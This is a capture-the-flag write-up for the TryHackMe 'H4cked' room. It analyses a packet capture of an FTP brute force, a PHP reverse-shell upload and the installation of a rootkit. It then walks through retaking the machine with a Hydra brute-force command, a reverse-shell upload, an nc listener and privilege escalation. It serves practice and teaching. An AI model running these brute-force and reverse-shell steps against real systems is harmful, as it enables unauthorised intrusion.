+++
title = "H4cked Writeup"
date = 2021-10-19

[taxonomies]
tags = ["writeup", "CTF"]
+++

[H4cked](https://tryhackme.com/room/h4cked) is a beginner room from TryHackMe. We apply both offensive and defensive concepts to complete it.

## Oh No, We've Been Hacked

The room begins with a scenario: an intruder has found their way into one of our machines, and a `.pcapng` file is our forensic evidence.

Opening it in Wireshark, we immediately see the attacker brute-forcing the FTP service on port 21:

![Wireshark FTP brute force](/img/hacked/Untitled.png)

The attacker is specifically targeting the user `jenny`:

![Targeting jenny](/img/hacked/Untitled%201.png)

And eventually succeeds. Following the TCP stream:

```
220 Hello FTP World!
USER jenny
331 Please specify the password.
PASS password123
230 Login successful.
SYST
215 UNIX Type: L8
PWD
257 "/var/www/html" is the current directory
PORT 192,168,0,147,225,49
200 PORT command successful. Consider using PASV.
LIST -la
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,0,147,196,163
200 PORT command successful. Consider using PASV.
STOR shell.php
150 Ok to send data.
226 Transfer complete.
SITE CHMOD 777 shell.php
200 SITE CHMOD command ok.
QUIT
221 Goodbye.
```

Key information extracted:

- FTP working directory: `/var/www/html`
- Uploaded file: `shell.php`

From the `FTP-DATA` packet, we can see the file contents in the clear: a PHP reverse shell from [pentestmonkey](http://pentestmonkey.net/tools/php-reverse-shell).

### Reverse Shell Execution

The attacker closes the FTP connection and requests `shell.php` via HTTP, which executes the PHP file and grants access to the machine.

All communication proceeds over an unencrypted TCP channel, so we can read everything in the clear:

![TCP stream](/img/hacked/Untitled%205.png)

From the stream we observe:

- First command after reverse shell: `whoami`
- Hostname: **wir3**
- TTY spawn command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

After gaining root via `sudo su`, the attacker downloaded **[Reptile](https://github.com/f0rb1dd3n/Reptile)**, a Linux rootkit granting stealth access and hidden boot persistence.

## Hack Back

Now we reclaim the machine.

The attacker changed the user's password, but we can replicate their approach. Using Hydra with the `rockyou` wordlist:

```bash
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://MACHINE.IP
```

With FTP access restored, we follow the same strategy:

**1.** Modify the reverse shell script with our IP and port:

```php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

**2.** Upload it via FTP, replacing the existing file.

**3.** Start a listener:

```bash
nc -nlvp 1234
```

**4.** Trigger execution by visiting `http://<machineIP>/shell.php`.

**5.** Spawn a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The shell runs as `www-data`. We saw jenny's password in the captured packets, so we switch users and escalate:

```bash
su jenny
sudo su
```

The flag is at `/root/Reptile/flag.txt`.
